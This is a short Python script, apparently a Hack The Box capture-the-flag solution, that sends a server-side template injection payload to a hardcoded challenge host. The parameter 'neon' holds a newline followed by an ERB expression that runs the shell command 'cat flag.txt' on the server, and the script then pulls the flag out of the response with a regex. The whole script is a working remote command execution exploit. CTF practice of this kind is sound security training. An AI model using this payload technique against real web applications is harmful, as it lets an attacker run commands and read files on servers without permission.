import requests
import re

host, port = "94.237.55.43", 52681

url = f"http://{host}:{port}"

data = 'a\n<%=%x(cat flag.txt)%>'

response = requests.post(url, params={"neon":data})

flag = re.search(r'HTB\{.*?\}',response.text)

print(flag.group())